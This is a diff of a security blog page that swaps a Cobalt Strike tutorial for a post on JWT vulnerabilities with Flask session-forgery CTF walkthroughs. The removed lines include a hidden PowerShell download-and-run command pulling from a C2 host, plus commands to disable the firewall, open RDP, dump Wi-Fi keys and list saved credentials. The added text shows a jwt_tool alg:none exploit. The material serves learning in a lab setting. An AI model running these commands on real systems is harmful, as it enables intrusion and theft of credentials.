@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="信息收集, jothon&#39;s blog">
+    <meta name="keywords" content="JWT漏洞利用, jothon&#39;s blog">
     <meta name="description" content="变强一点点">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>信息收集 | jothon&#39;s blog</title>
+    <title>JWT漏洞利用 | jothon&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">信息收集</h1>
+                    <h1 class="description center-align post-title">JWT漏洞利用</h1>
                 </div>
             </div>
         </div>
@@ -436,15 +436,6 @@
                 </div>
                 <div class="col s5 right-align">
                     
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
-                                内网渗透
-                            </a>
-                        
-                    </div>
-                    
                 </div>
             </div>
 
@@ -452,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2024-09-10
+                    2024-09-19
                 </div>
                 
 
@@ -476,89 +467,78 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="cobaltStrike4-3安装"><a href="#cobaltStrike4-3安装" class="headerlink" title="cobaltStrike4.3安装"></a>cobaltStrike4.3安装</h2><p>哎，装个4.0的版本还是不行，jdk版本是11的</p>
-<p>百度网盘：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1XOSL8o4hotOIJm1u9Raq9w">https://pan.baidu.com/s/1XOSL8o4hotOIJm1u9Raq9w</a> 提取码: n1qm </p>
-<p>kali里面解压缩：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./teamserver 192.168.23.152 123456    #kali的ip地址，密码：123456[一次性的，可以随时更改]</span><br></pre></td></tr></table></figure>
+                <h2 id="JWT漏洞分析"><a href="#JWT漏洞分析" class="headerlink" title="JWT漏洞分析"></a>JWT漏洞分析</h2><p>JWT认证攻击详细解答:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/16699442.html">https://www.cnblogs.com/backlion/p/16699442.html</a></p>
+<p>在线利用工具：<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
+<p>jwt工具：<a target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a></p>
+<p>基础使用：python3 jwt_tool.py jwt</p>
+<p>要运行特定类型的漏洞利用，您需要选择 eXploit (-X) 选项并选择漏洞（此处使用“a”表示<em>alg:none</em>漏洞利用）：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw -X a</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/1726147569177-31.png" alt="img"></p>
-<p>windows下启动</p>
-<p><img src="/img/1726147569175-1.png" alt="img"></p>
-<p>成功连接</p>
-<p><img src="/img/1726147569175-2.png" alt="img"></p>
-<h2 id="cobaltStrike基本使用"><a href="#cobaltStrike基本使用" class="headerlink" title="cobaltStrike基本使用"></a>cobaltStrike基本使用</h2><p>准备一台肉鸡，这里我使用windows7来测试，哎，windows10好卡</p>
-<p>cs上</p>
-<p><img src="/img/1726147569175-3.png" alt="img"></p>
-<p>填写主机的ip地址，开启监听即可</p>
-<p><img src="/img/1726147569175-4.png" alt="img"></p>
-<p>window7上输入</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.5.48:80/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p>连接成功，输入shell whoami来执行一下</p>
-<p><img src="/img/1726147569175-5.png" alt="img"></p>
-<h2 id="使用CS进行本地工作组收集信息"><a href="#使用CS进行本地工作组收集信息" class="headerlink" title="使用CS进行本地工作组收集信息"></a>使用CS进行本地工作组收集信息</h2><p>Shell ipconfig,可以查看到其ip地址</p>
-<p><img src="/img/1726147569175-6.png" alt="img"></p>
-<p>shell systeminfo</p>
-<p><img src="/img/1726147569175-7.png" alt="img"></p>
-<p>查看系统结构体系结构</p>
-<p>echo %PROCESSOR_ARCHITECTURE%</p>
-<p><img src="/img/1726147569175-8.png" alt="img"></p>
-<p>查看系统安装了哪些软件及版本：wmic product get name,version</p>
-<p><img src="/img/1726147569176-9.png" alt="img"></p>
-<p>本机运行服务：wmic service list brief</p>
-<p><img src="/img/1726147569176-10.png" alt="img"></p>
-<p>查看进程:tasklist</p>
-<p><img src="/img/1726147569176-11.png" alt="img"></p>
-<p>查看计划任务：schtasks &#x2F;query &#x2F;fo LIST &#x2F;v  [如果报错的话可以先输入chcp473改变其编码]</p>
-<p><img src="/img/1726147569176-12.png" alt="img"></p>
-<p>电脑开机时间：net statistics workstation</p>
-<p><img src="/img/1726147569176-13.png" alt="img"></p>
-<p>查看本地有几个用户：net user</p>
-<p><img src="/img/1726147569176-14.png" alt="img"></p>
-<p>当前会话列表：net session</p>
-<p><img src="/img/1726147569176-15.png" alt="img"></p>
-<p>查询端口开放信息： netstat -ano</p>
-<p><img src="/img/1726147569176-16.png" alt="img"></p>
-<p>查询补丁信息：依旧可以使用shell systeminfo来查看</p>
-<p><img src="/img/1726147569176-17.png" alt="img"></p>
-<p>查看杀毒软件信息：wmic &#x2F;namespace:\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe，目标靶机没有杀毒软件，就以我的主机为例</p>
-<p><img src="/img/1726147569176-18.png" alt="img"></p>
-<p>查询共享列表：net share</p>
-<p><img src="/img/1726147569176-19.png" alt="img"></p>
-<p>查看路由信息：route print</p>
-<p><img src="/img/1726147569176-20.png" alt="img"></p>
-<p>查看防火墙的禁用状态：netsh firewall show state</p>
-<p><img src="/img/1726147569176-21.png" alt="img"></p>
-<p>关闭防火墙的命令</p>
-<p>Netsh firewall set opmode  disable</p>
-<p><img src="/img/1726147569176-22.png" alt="img"></p>
-<p>防火墙允许3389端口放行</p>
-<p>netsh firewall set portopening TCP 3389 ENABLE</p>
-<p><img src="/img/1726147569176-23.png" alt="img"></p>
-<p>查看当前连接wifi密码名字</p>
-<p>netsh wlan show profile name&#x3D;”HYNUCTF520” key&#x3D;clear</p>
-<p><img src="/img/1726147569176-24.png" alt="img"></p>
-<p>查看rdp端口</p>
-<p>REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server\WinStations\RDP-Tcp &#x2F;v PortNumber    #16进制转10进制为3389</p>
-<p><img src="/img/1726147569176-25.png" alt="img"></p>
-<p>查看当前凭据</p>
-<p>cmdkey &#x2F;l</p>
-<p><img src="/img/1726147569176-26.png" alt="img"></p>
-<p>查看局域网所有IP信息</p>
-<p>Arp-a </p>
-<p><img src="/img/1726147569176-27.png" alt="img"></p>
-<p>查看最近打开的文件</p>
-<p>Dir %appdata%\Microsoft\Windows\Recent</p>
-<p><img src="/img/1726147569177-28.png" alt="img"></p>
-<p>查看本地工作组</p>
-<p>Net localgroup</p>
-<p><img src="/img/1726147569177-29.png" alt="img"></p>
-<p>查看本地工作组users</p>
-<p>Net localgroup users</p>
-<p><img src="/img/1726147569177-30.png" alt="img"></p>
-<p>查看rdp的保存凭据</p>
-<p>dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials*</p>
-<p><img src="/img/image-20240913084522181.png" alt="image-20240913084522181"></p>
+
+<h3 id="1-JWT的简介"><a href="#1-JWT的简介" class="headerlink" title="1.JWT的简介"></a>1.JWT的简介</h3><p>JWT全称为json web token 将json对象作为载体进行传输信息，通常用于身份认证和信息交换。JWT可以使用密钥(HMAC算法)或者使用RSA或ECDSA的公钥&#x2F;私钥对自身进行签名</p>
+<h3 id="2-JWT的格式"><a href="#2-JWT的格式" class="headerlink" title="2:JWT的格式"></a>2:JWT的格式</h3><p>每当用户访问站点中的资源时，对应的请求头认证默认为Authorization:jwt JWT令牌认证以eyj开头</p>
+<p>JWT的数据头部如下：</p>
+<p>JWT的数据分为三部分：头部(header),有效载荷(Payload),签名(Signature)</p>
+<p>三个部分以英文逗号隔开，JWT的内容以base64进行编码</p>
+<p>下面举个例子：</p>
+<p>(1):头部信息包含了JWT的配置方面，例如签名算法(alg)，令牌类型(JWT)和加密算法(alg)或者算法使用的密钥文件</p>
+<p>Head:eyJraWQiOiJrZXlzLzNjM2MyZWExYzNmMTEzZjY0OWRjOTM4OWRkNzFiODUxIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ</p>
+<p>{“kid”:”keys&#x2F;3c3c2ea1c3f113f649dc9389dd71b851”,”typ”:”JWT”,”alg”:”RS256”}</p>
+<p>(2):有效载荷</p>
+<p>有效载荷用于存储用户的数据，例如用户名(test123)</p>
+<p>payload：eyJzdWIiOiJkdWJoZTEyMyJ9</p>
+<p>{“sub”:”dubhe123”}</p>
+<p>(3):签名</p>
+<p>Signature 需要使用编码后的header和payload以及我们提供的一个密钥，然后使用header中指定的签名算法通常是RS256(RSA非对称加密和私钥签名)和HS256(HMAC SHA256对称加密)算法进行签名，签名的作用是保证jwt没有被篡改过</p>
+<p>下面是一个用HS256生成Jw&#x3D;WT的代码例子</p>
+<p>HMACSHA256(base64Encode(header) + “.” + base64urlEncode(payload),secret)</p>
+<p>Signature:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XicP4pq_WIF2bAVtPmAlWIvAUad_eeBhDOQe2MXwHrE8a7930LlfQq1lFqBs0wLMhht6Z9BQXBRos9jvQ7eumEUFWFYKRZfu9POTOEE79wxNwTxGdHc5VidvrwiytkRMtGKIyhbv68duFPI68Qnzh0z0M7t5LkEDvNivfOrxdxwb7IQsAuenKzF67Z6UArbZE8odNZAA9IYaWHeh1b4OUG0OPM3saXYSG-Q1R5X_5nlWogHHYwy2kD9v4nk1BaQ5kHJIl8B3Nc77gVIIVvzI9N_klPcX5xsuw9SsUfr9d99kaKyMUSXxeiZVM-7os_dw3ttz2f-TJSNI0DYprHHLFw</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-JWT常见安全问题"><a href="#3-JWT常见安全问题" class="headerlink" title="3:JWT常见安全问题"></a>3:JWT常见安全问题</h3><p>1：签名算法可被修改为none(CVE-2015-9235)</p>
+<p>JWT支持算法设定为“None”,如果“alg”字段设为“None”,那么签名会被置空，这样的任何token都是有效的</p>
+<p>2：未校验签名</p>
+<p>某些服务端并未校验JWT签名，可以尝试修改payload后然后直接请求token或者直接删除signature再次请求查看其是否还有效。</p>
+<p>通过在线工具jwt.io修改payload数据</p>
+<p>3：JWKS公钥 注入 ——伪造密钥(CVE-2018-0114)</p>
+<p>创建一个新的 RSA 证书对，注入一个 JWKS 文件，攻击者可以使用新的私钥对令牌进行签名，将公钥包含在令牌中，然后让服务使用该密钥来验证令牌</p>
+<p>攻击者可以通过以下方法来伪造JWT：删除原始签名，向标头添加新的公钥，然后使用与该公钥关联的私钥进行签名。</p>
+<p>4：空签名(CVE-2020-28042)</p>
+<p>从令牌末尾删除签名</p>
+<p>5：敏感信息泄露</p>
+<p>JWT的header头base64解码可泄露敏感数据如密钥文件或者密码或者注入漏洞</p>
+<p>6：KID参数漏洞</p>
+<h3 id="NSSRound-13-Basic-flask-jwt"><a href="#NSSRound-13-Basic-flask-jwt" class="headerlink" title="[NSSRound#13 Basic]flask?jwt?"></a>[NSSRound#13 Basic]flask?jwt?</h3><p>考察知识点：session伪造，jwt</p>
+<p>使用工具：<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">GitHub - noraj&#x2F;flask-session-cookie-manager: :cookie: Flask Session Cookie Decoder&#x2F;Encoder</a></p>
+<p>随意注册一个账号</p>
+<p>抓包：访问&#x2F;getFlag</p>
+<p><img src="/img/image-20240920105914385.png" alt="image-20240920105914385"></p>
+<p><img src="/img/image-20240920110101258.png" alt="image-20240920110101258"></p>
+<p>提取session值</p>
+<p>.eJwlzjEOwzAIQNG7eO6AAWPIZSJjsNo1aaaqd2-kjl_6w_uUfR15Psv2Pq58lP0VZSuC5Gsmtt4xMCOl1xhZHWtt6jLdnSUYUj0npw6JWEbWpDYcpnFvAGQO1IXrnL3nUEQU6oPuEhFuKIq2KjuBNGOdYJA5KMoNuc48_hos3x-4sS5U.Zuzjow.09lgm1OqoVaAVLe76LXT-TkqWnA</p>
+<p>kali自带python模块较为完善，可以在kali里面运行</p>
+<p><img src="/img/image-20240920111524083.png" alt="image-20240920111524083"></p>
+<p>重新注册一下获得的第二个session值经过伪造后可以猜测其id值为3，所以我们大胆猜测admin的id值为1</p>
+<p>原始数据：</p>
+<p>‘{“_fresh”:true,”_id”:”623bfce25772d2ede671dae1b21158b6cbbb46d40e8bec4e8a6ddf93956152a98d1580039b037641cc77ea8222637a3c776664526829f14b3065948c090eea3d”,”_user_id”:”2”}’</p>
+<p>小写t变成T ,id:后加个空格，不然会报错</p>
+<p>修改数据：</p>
+<p>“{‘_fresh’:True, ‘_id’: ‘623bfce25772d2ede671dae1b21158b6cbbb46d40e8bec4e8a6ddf93956152a98d1580039b037641cc77ea8222637a3c776664526829f14b3065948c090eea3d’, ‘_user_id’: ‘1’}”</p>
+<p>F12查看到密码为：th3f1askisfunny</p>
+<p><img src="/img/image-20240920114313425.png" alt="image-20240920114313425"></p>
+<p><img src="/img/image-20240920112609288.png" alt="image-20240920112609288"></p>
+<p>修改session值获取flag</p>
+<p><img src="/img/image-20240920112540806.png" alt="image-20240920112540806"></p>
+<p>NSSCTF{216857c5-8aaa-4cfe-9990-4081f74efb4e}</p>
+<h3 id="NSSRound-13-Basic-flask-jwt-hard"><a href="#NSSRound-13-Basic-flask-jwt-hard" class="headerlink" title="[NSSRound#13 Basic]flask?jwt?(hard)"></a>[NSSRound#13 Basic]flask?jwt?(hard)</h3><p>第一题的pro版，区别在于开个debug来找到密钥，其他形式和第一题无区别，注册访问&#x2F;wor路由即可拿到本题所需要的密钥</p>
+<p><img src="/img/image-20240920201459394.png" alt="image-20240920201459394"></p>
+<p>访问其&#x2F;wor路由，给出一个时间，可知session里包含time，我们尝试修改session的值，获取key的值，眼睛不好可以复制到记事本里看：hardgam3_C0u1d_u_f1ndM3????</p>
+<p><img src="/img/image-20240920203659645.png" alt="image-20240920203659645"></p>
+<p><img src="/img/image-20240920203837691.png" alt="image-20240920203837691"></p>
+<p>找到密钥之后就像第一题一样解决之后就行</p>
 
                 
             </div>
@@ -585,7 +565,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://jothon.github.io/2024/09/10/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">https://jothon.github.io/2024/09/10/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</a>
+                    <a href="https://jothon.github.io/2024/09/19/JWT%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">https://jothon.github.io/2024/09/19/JWT%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -794,13 +774,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2024/09/19/JWT%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
+                <a href="/2024/09/22/%E5%BE%A1%E7%BD%91%E6%9D%AF/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="JWT漏洞利用">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="御网杯">
                         
-                        <span class="card-title">JWT漏洞利用</span>
+                        <span class="card-title">御网杯</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -811,7 +791,7 @@
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2024-09-19
+                            <i class="far fa-clock fa-fw icon-date"></i>2024-09-22
                         </span>
                         <span class="publish-author">
                             
@@ -831,13 +811,13 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2024/09/04/BaseCTF/">
+                <a href="/2024/09/10/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="BaseCTF">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="信息收集">
                         
-                        <span class="card-title">BaseCTF</span>
+                        <span class="card-title">信息收集</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -848,14 +828,14 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2024-09-04
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-09-10
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" class="post-category">
-                                    比赛复现
+                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
+                                    内网渗透
                                 </a>
                             
                             
